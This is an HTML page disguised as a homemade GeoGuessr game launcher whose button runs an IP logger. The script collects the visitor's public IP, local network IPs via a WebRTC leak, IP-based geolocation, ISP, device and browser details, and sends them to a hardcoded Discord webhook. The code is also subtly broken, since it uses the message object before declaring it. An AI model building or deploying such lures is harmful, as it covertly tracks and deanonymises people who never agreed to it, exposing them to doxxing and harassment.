<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <h1>click the button to enter geoguessr made by me</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">click me twin</button>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        async function getIPAddress() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                try {
                    const res = await fetch('https://api64.ipify.org?format=json');
                    const data = await res.json();
                    return data.ip;
                } catch {
                    return 'Could not get IP';
                }
            }
        }
        
        async function getLocation(ip) {
            try {
                return new Promise((resolve) => {
                    const script = document.createElement('script');
                    script.src = `http://ip-api.com/json/${ip}?callback=handleLocation`;
                    
                    window.handleLocation = function(data) {
                        document.head.removeChild(script);
                        delete window.handleLocation;
                        
                        if (data.status === 'success') {
                            resolve({
                                lat: data.lat,
                                lon: data.lon,
                                city: data.city,
                                region: data.regionName,
                                country: data.country,
                                isp: data.isp,
                                zip: data.zip,
                                timezone: data.timezone,
                                source: 'ip-api.com'
                            });
                        } else {
                            resolve(getFallbackLocation());
                        }
                    };
                    
                    document.head.appendChild(script);
                    
                    setTimeout(() => {
                        if (script.parentNode) {
                            document.head.removeChild(script);
                        }
                        resolve(getFallbackLocation());
                    }, 3000);
                });
            } catch {
                return getFallbackLocation();
            }
        }
        
        function getFallbackLocation() {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let city = 'Unknown';
            let country = 'Unknown';
            
            if (timezone.includes('America')) {
                if (timezone.includes('New_York')) {
                    city = 'New York';
                    country = 'United States';
                } else if (timezone.includes('Los_Angeles')) {
                    city = 'Los Angeles';
                    country = 'United States';
                } else if (timezone.includes('Chicago')) {
                    city = 'Chicago';
                    country = 'United States';
                } else {
                    city = 'North America';
                    country = 'United States/Canada';
                }
            } else if (timezone.includes('Europe')) {
                if (timezone.includes('London')) {
                    city = 'London';
                    country = 'United Kingdom';
                } else if (timezone.includes('Paris')) {
                    city = 'Paris';
                    country = 'France';
                } else if (timezone.includes('Berlin')) {
                    city = 'Berlin';
                    country = 'Germany';
                } else {
                    city = 'Europe';
                    country = 'European Union';
                }
            } else if (timezone.includes('Asia')) {
                if (timezone.includes('Tokyo')) {
                    city = 'Tokyo';
                    country = 'Japan';
                } else if (timezone.includes('Shanghai')) {
                    city = 'Shanghai';
                    country = 'China';
                } else if (timezone.includes('Singapore')) {
                    city = 'Singapore';
                    country = 'Singapore';
                } else {
                    city = 'Asia';
                    country = 'Asia';
                }
            } else if (timezone.includes('Australia')) {
                city = 'Sydney';
                country = 'Australia';
            }
            
            return {
                lat: 'Approximate',
                lon: 'Approximate',
                city: city,
                region: 'Based on timezone',
                country: country,
                isp: 'Unknown (CORS blocked)',
                zip: 'Unknown',
                timezone: timezone,
                source: 'Timezone guess'
            };
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) {
                    resolve('Not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not found');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not found');
                }, 1000);
            });
        }
        
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            
            let device = 'Desktop';
            if (/mobile/i.test(ua.toLowerCase())) device = 'Mobile';
            if (/tablet/i.test(ua.toLowerCase())) device = 'Tablet';
            
            let os = 'Unknown';
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/mac/i.test(ua)) os = 'macOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/iphone|ipad/i.test(ua)) os = 'iOS';
            
            let browser = 'Unknown';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
            else if (/firefox/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
            else if (/edge/i.test(ua)) browser = 'Edge';
            else if (/opera/i.test(ua)) browser = 'Opera';
            
            return {
                device: device,
                os: os,
                browser: browser,
                language: navigator.language || 'Unknown',
                platform: navigator.platform || 'Unknown',
                userAgent: ua.substring(0, 200)
            };
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'preparing web..';
            status.style.display = 'none';
            
            try {
                const publicIP = await getIPAddress();
                
                const browserInfo = getBrowserInfo();
                
                const localIP = await getLocalIP();
                
                const location = await getLocation(publicIP);
                
                const now = new Date();
                const timeStr = now.toLocaleString();
                
                let mapsLink = 'No exact coordinates';
                if (location.lat && location.lat !== 'Approximate' && location.lon && location.lon !== 'Approximate') {
                    mapsLink = `https://maps.google.com/?q=${location.lat},${location.lon}`;
                } else if (location.city !== 'Unknown') {
                    mapsLink = `https://maps.google.com/?q=${encodeURIComponent(location.city + ', ' + location.country)}`;
                }
                
                const embed = {
                    title: "NEW VISITOR DETECTED",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "IP ADDRESSES",
                            value: `Public: \`${publicIP}\`\nLocal: \`${localIP}\``,
                            inline: true
                        },
                        {
                            name: "LOCATION",
                            value: `Country: ${location.country}\nCity: ${location.city}\nRegion: ${location.region}\nISP: ${location.isp}\nSource: ${location.source}`,
                            inline: true
                        },
                        {
                            name: "MAPS LINK",
                            value: mapsLink,
                            inline: true
                        },
                        {
                            name: "DEVICE",
                            value: `Type: ${browserInfo.device}\nOS: ${browserInfo.os}\nBrowser: ${browserInfo.browser}\nLanguage: ${browserInfo.language}`,
                            inline: true
                        },
                        {
                            name: "TIME & SESSION",
                            value: `Time: ${timeStr}\nPage: ${window.location.href}\nReferrer: ${document.referrer || 'Direct visit'}`,
                            inline: false
                        },
                        {
                            name: "USER AGENT",
                            value: `\`\`\`${browserInfo.userAgent}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: "IP Logger â€¢ GitHub Pages Compatible"
                    },
                    timestamp: now.toISOString()
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                const discordMessage = {
                    embeds: [embed],
                    username: "IP Logger"
                };
                
                if (response.ok) {
                    status.textContent = 'Information sent to Discord!';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'Sent basic info to Discord.';
                status.style.color = '#FF9800';
                status.style.backgroundColor = '#FFF3E0';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
